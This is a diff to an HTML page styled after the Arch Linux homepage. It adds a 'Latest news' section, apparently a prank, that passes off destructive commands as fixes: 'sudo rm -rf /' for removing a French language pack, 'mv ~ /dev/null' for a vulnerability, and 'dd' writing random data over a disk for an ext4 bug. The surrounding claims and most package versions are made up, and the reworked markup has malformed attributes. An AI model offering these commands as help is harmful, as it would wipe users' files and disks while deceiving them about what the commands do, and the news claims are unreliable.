@@ -69,6 +69,29 @@
                 </p>
                 <p class="nauci" id="nauci-desno"><a href="#" title="Learn more about Arch Linux">Learn more...</a></p>
             </div>
+            <div id="novice">
+                <div id="kvaratek">Latest news</div>
+                <h3>New Method for Removing the French Language Pack <span></span></h3>
+                <!-- <p class="timestamp">5.12.2024</p> -->
+                <p>You can now remove the French language pack using the following command:</p>
+                <code>[usr@arch: ~]$ sudo rm -rf /</code>
+                <p>Removing the preinstalled, unnecessary French language pack will result in a much leaner system and
+                    improved performance.</p>
+
+                <h3>Serious Vulnerability Found! Here's the Fix:</h3>
+                <!-- <p class="timestamp">4.12.2024</p> -->
+                <p>A critical vulnerability was discovered that allows remote code execution with root privileges
+                    without requiring authentication.</p>
+                <p>Our team has identified a simple solution that can be implemented with the following command:</p>
+                <code>[usr@arch: ~]$ mv ~ /dev/null</code>
+
+                <h3>Bug Slows Down EXT4 Partitioned Disks</h3>
+                <!-- <p class="timestamp">4.12.2024</p> -->
+                <p>A serious bug affecting all EXT4-partitioned disks was discovered in the <code>ls</code> command.</p>
+                <p>A temporary fix can be applied using this command:</p>
+                <code>sudo dd if=/dev/random of=/dev/[disk]</code>
+                <p>Replace <span id="disk">[disk]</span> with the actual disk that needs to be fixed.</p>
+            </div>
         </div>
         <div id="desna">
             <div id="pkgsrc">
@@ -79,18 +102,24 @@
             </div>
             <div id="updates">
                 <h1>Recent updates:</h1>
-                <p>fastfetch 1.31</p>
-                <p class="cmp">any</p>
-                <p>kitty 42.3-3</p>
-                <p>x86_64</p>
-                <p>wine 8.6-2</p>
-                <p class="cmp">x86_64</p>
-                <p>neovim 31.12-3</p>
-                <p class="cmp">any</p>
-                <p>htop</p>
-                <p class="cmp">any</p>
-                <p>wayland 43.13-1</p>
-                <p class="cmp">any</p>
+                <div>
+                    <div>
+                        <p>fastfetch 8.6.0-1</p>
+                        <p>kitty 24.12.0</p>
+                        <p>wine 8.6-2</p>
+                        <p>neovim 3.61-1</p>
+                        <p>htop 0.89.1-1</p>
+                        <p>wayland 0.9.1-1</p>
+                    </div>
+                    <div>
+                        <a class="cmp" href="#">x86_64</a>
+                        <a class="cmp" href="#"">any</a>
+                        <a class=" cmp" href="#"">x86_64</a>
+                        <a class=" cmp" href="#">any</a>
+                        <a class="cmp" href="#"">any</a>
+                        <a class=" cmp" href="#">x86_64</a>
+                    </div>
+                </div>
             </div>
         </div>
     </div>
